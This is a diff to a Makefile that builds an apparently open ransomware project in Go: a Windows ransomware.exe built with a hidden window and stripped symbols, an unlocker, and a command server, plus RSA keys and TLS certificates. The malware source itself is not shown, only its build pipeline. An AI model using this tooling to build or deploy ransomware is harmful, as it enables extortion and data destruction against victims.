@@ -1,14 +1,16 @@
 .PHONY: all deps
 
-all: build
+all: build clean
 
 PROJECT_DIR=$(shell pwd)
 BUILD_DIR=$(PROJECT_DIR)/build
 BIN_DIR=$(PROJECT_DIR)/bin
 SERVER_HOST=localhost
-SERVER_URL=https://$(SERVER_HOST):8080
+SERVER_PORT=8080
+SERVER_URL=https://$(SERVER_HOST):$(SERVER_PORT)
 HIDDEN=-H windowsgui
-LINKER_VARS=-X main.ServerBaseURL=$(SERVER_URL)
+R_LINKER_VARS=-X main.ServerBaseURL=$(SERVER_URL)
+S_LINKER_VARS=-X main.DefaultAddress=$(SERVER_HOST):$(SERVER_PORT)
 
 deps:
 	go get -v github.com/Masterminds/glide
@@ -16,30 +18,23 @@ deps:
 	go get -u github.com/akavel/rsrc \
 		github.com/jteeuwen/go-bindata/...
 
-pre-build: clean-build clean-bin
-	mkdir -p $(BUILD_DIR)/ransomware
-	mkdir -p $(BUILD_DIR)/server
-	mkdir -p $(BUILD_DIR)/unlocker
+pre-build: clean-bin
+	mkdir -p $(BUILD_DIR)/{ransomware,unlocker,server}
 	openssl genrsa -out $(BUILD_DIR)/server/private.pem 4096
 	openssl rsa -in $(BUILD_DIR)/server/private.pem -outform PEM -pubout -out $(BUILD_DIR)/ransomware/public.pem
 	cd $(BUILD_DIR)/ransomware && go-bindata -pkg main -o public_key.go public.pem
 	rsrc -manifest ransomware.manifest -ico icon.ico -o $(BUILD_DIR)/ransomware/ransomware.syso
 	cp $(BUILD_DIR)/ransomware/ransomware.syso $(BUILD_DIR)/unlocker/unlocker.syso
-	cp -r cmd/ransomware $(BUILD_DIR)
-	cp -r server $(BUILD_DIR)
-	cp -r cmd/unlocker $(BUILD_DIR)
+	cp -r $(PROJECT_DIR)/cmd/{ransomware,unlocker,server} $(BUILD_DIR)
 	cd $(BUILD_DIR)/server && env GOOS=linux go run $(GOROOT)/src/crypto/tls/generate_cert.go --host $(SERVER_HOST)
-	mkdir -p $(BIN_DIR)
 	mkdir -p $(BIN_DIR)/server
 
-binaries:
-	cd $(BUILD_DIR)/ransomware && GOOS=windows GOARCH=386 go build --ldflags "-s -w $(HIDDEN) $(LINKER_VARS)" -o $(BIN_DIR)/ransomware.exe
+build: pre-build
+	cd $(BUILD_DIR)/ransomware && GOOS=windows GOARCH=386 go build --ldflags "-s -w $(HIDDEN) $(R_LINKER_VARS)" -o $(BIN_DIR)/ransomware.exe
 	cd $(BUILD_DIR)/unlocker && GOOS=windows GOARCH=386 go build --ldflags "-s -w" -o $(BIN_DIR)/unlocker.exe
-	cd $(BUILD_DIR)/server && go build && mv `ls|grep 'server\|key.pem\|cert.pem\|private.pem'` $(BIN_DIR)/server
+	cd $(BUILD_DIR)/server && go build --ldflags "-s -w $(S_LINKER_VARS)" && mv `ls|grep -v 'server.go'` $(BIN_DIR)/server
 
-build: pre-build binaries clean-build
-
-clean-build:
+clean:
 	rm -r $(BUILD_DIR) || true
 
 clean-bin:
